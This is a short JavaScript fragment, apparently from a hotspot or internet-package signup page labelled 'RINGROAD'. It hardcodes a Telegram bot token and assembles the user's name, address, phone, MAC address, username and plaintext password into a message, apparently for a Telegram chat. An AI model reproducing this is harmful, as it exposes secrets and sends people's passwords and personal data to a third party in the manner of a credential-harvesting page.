...
token = "400120248:AAHzMob9MtGieQkUX6PVYu54UCFc_huPCu0";
message = "<b>MEMBER SIGNUP RINGROAD</b>%0Anama : "+ $("#nama").val() + "%0Aalamat : " + $("#alamat").val() + "%0Ano. hp : " + $("#nomor").val() + "%0Amac : " + $("#mac").val() + "%0Apaket : " + $("#paket").val() + "%0Ausername : " + $("#username").val() + "%0Apassword : " + $("#password2").val();
